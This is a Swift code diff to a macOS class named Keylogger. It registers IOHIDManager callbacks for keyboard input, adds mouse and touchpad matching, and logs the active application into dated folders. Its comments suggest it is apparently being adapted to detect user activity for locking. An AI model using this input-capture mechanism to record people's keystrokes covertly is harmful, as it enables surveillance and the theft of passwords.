@@ -19,9 +19,10 @@ class Keylogger
     var appData:URL                             // Folder
     var keyData:URL                             // Folder
     var devicesData:URL                         // Folder
-    
+
+
     init()
-    { 
+    {
         appData = bundlePathURL.appendingPathComponent("Data").appendingPathComponent("App") // Creates App Folder in Data Folder
         keyData = bundlePathURL.appendingPathComponent("Data").appendingPathComponent("Key") // Creates Key Folder in Data Folder
         devicesData = bundlePathURL.appendingPathComponent("Data").appendingPathComponent("Devices") // Creates Devices Folder in Data Folder
@@ -46,42 +47,62 @@ class Keylogger
             print("Can't create manager")
             exit(1);
         }
+
+        let foo = [kIOHIDDeviceUsagePairsKey: [[kIOHIDDeviceUsagePageKey: 1, kIOHIDDeviceUsageKey: 2],
+                                               [kIOHIDDeviceUsagePageKey: 1, kIOHIDDeviceUsageKey: 1],
+                                               [kIOHIDDeviceUsagePageKey: 13, kIOHIDDeviceUsageKey: 5]] as CFArray] as! CFMutableDictionary
+
+        deviceList = deviceList.adding(foo) as NSArray
+
         deviceList = deviceList.adding(CreateDeviceMatchingDictionary(inUsagePage: kHIDPage_GenericDesktop, inUsage: kHIDUsage_GD_Keyboard)) as NSArray
         deviceList = deviceList.adding(CreateDeviceMatchingDictionary(inUsagePage: kHIDPage_GenericDesktop, inUsage: kHIDUsage_GD_Keypad)) as NSArray
+        deviceList = deviceList.adding(CreateDeviceMatchingDictionary(inUsagePage: kHIDPage_GenericDesktop, inUsage: kHIDUsage_GD_Mouse)) as NSArray
+
+
+        // Mouse
+        deviceList = deviceList.adding(CreateDeviceMatchingDictionary(inUsagePage: kHIDPage_GenericDesktop, inUsage: kHIDUsage_GD_Pointer)) as NSArray
+        // Track
+        deviceList = deviceList.adding(CreateDeviceMatchingDictionary(inUsagePage: kHIDPage_Digitizer, inUsage: kHIDUsage_Dig_TouchPad)) as NSArray
+        deviceList = deviceList.adding(CreateDeviceMatchingDictionary(inUsagePage: kHIDPage_Digitizer, inUsage: kHIDUsage_Dig_Touch)) as NSArray
+        deviceList = deviceList.adding(CreateDeviceMatchingDictionary(inUsagePage: 1, inUsage: 2)) as NSArray
 
         IOHIDManagerSetDeviceMatchingMultiple(manager, deviceList as CFArray)
-        
-        
-       
+
+
+
         let observer = UnsafeMutableRawPointer(Unmanaged.passUnretained(self).toOpaque())
-        
+
         /* App switching notification*/
         NSWorkspace.shared.notificationCenter.addObserver(self,
-                                                            selector: #selector(activatedApp),
-                                                            name: NSWorkspace.didActivateApplicationNotification,
-                                                            object: nil)
-         /* Connected and Disconnected Call Backs */
-        IOHIDManagerRegisterDeviceMatchingCallback(manager, CallBackFunctions.Handle_DeviceMatchingCallback, observer)
-        
-        IOHIDManagerRegisterDeviceRemovalCallback(manager, CallBackFunctions.Handle_DeviceRemovalCallback, observer)
-        
+                                                          selector: #selector(activatedApp),
+                                                          name: NSWorkspace.didActivateApplicationNotification,
+                                                          object: nil)
+        /* Connected and Disconnected Call Backs */
+        // We can ignore these if we are not tracking which device is in use at any point.
+        // TODO: In future we may decide to give the user a choice of devices whose activity will disable locking.
+        // IOHIDManagerRegisterDeviceMatchingCallback(manager, CallBackFunctions.Handle_DeviceMatchingCallback, observer)
+        //
+        // IOHIDManagerRegisterDeviceRemovalCallback(manager, CallBackFunctions.Handle_DeviceRemovalCallback, observer)
+
         /* Input value Call Backs */
         IOHIDManagerRegisterInputValueCallback(manager, CallBackFunctions.Handle_IOHIDInputValueCallback, observer);
-        
+
+        // IOHIDManagerRegisterInputReportCallback(manager, CallBackFunctions.Handle_IOHIDInputReportCallback, observer);
+
         /* Open HID Manager */
         let ioreturn: IOReturn = openHIDManager()
         if ioreturn != kIOReturnSuccess
         {
             print("Can't open HID!")
         }
-        
+
         /* Scheduling the loop */
         scheduleHIDLoop()
-       
+
         /* Running in Loop */
         RunLoop.current.run()
     }
-    
+
     @objc dynamic func activatedApp(notification: NSNotification)
     {
         if  let info = notification.userInfo,
@@ -89,7 +110,7 @@ class Keylogger
             let name = app.localizedName
         {
             self.appName = name
-            
+
             let dateFolder = "\(CallBackFunctions.calander.component(.day, from: Date()))-\(CallBackFunctions.calander.component(.month, from: Date()))-\(CallBackFunctions.calander.component(.year, from: Date()))"
             let path = self.appData.appendingPathComponent(dateFolder)
             if !FileManager.default.fileExists(atPath: path.path)
@@ -119,28 +140,36 @@ class Keylogger
         }
     }
 
+    // An application intersted in only matching on one criteria would only add the
+    // kIOHIDDeviceUsageKey and kIOHIDDeviceUsagePageKey keys to the matching dictionary.
+    // If it is interested in a device that has multiple behaviors, the application would
+    // instead add an array or dictionaries referenced by kIOHIDDeviceUsagePairsKey to his
+    // matching dictionary.
+
+
     /* For Keyboard */
     func CreateDeviceMatchingDictionary(inUsagePage: Int ,inUsage: Int ) -> CFMutableDictionary
     {
         /* // note: the usage is only valid if the usage page is also defined */
-        
+
         let resultAsSwiftDic = [kIOHIDDeviceUsagePageKey: inUsagePage, kIOHIDDeviceUsageKey : inUsage]
+        //        let resultAsSwiftDic = [kIOHIDDeviceUsagePairsKey : thing]
         let resultAsCFDic: CFMutableDictionary = resultAsSwiftDic as! CFMutableDictionary
         return resultAsCFDic
     }
-    
+
     func openHIDManager() -> IOReturn
     {
         return IOHIDManagerOpen(manager, IOOptionBits(kIOHIDOptionsTypeNone));
     }
-    
+
     func scheduleHIDLoop()
     {
         IOHIDManagerScheduleWithRunLoop(manager, CFRunLoopGetMain(), CFRunLoopMode.defaultMode.rawValue)
     }
-    
-    
-    
+
+
+
     var keyMap: [UInt32:[String]]
     {
         var map = [UInt32:[String]]()
@@ -255,3 +284,4 @@ class Keylogger
     }
 
 }
+
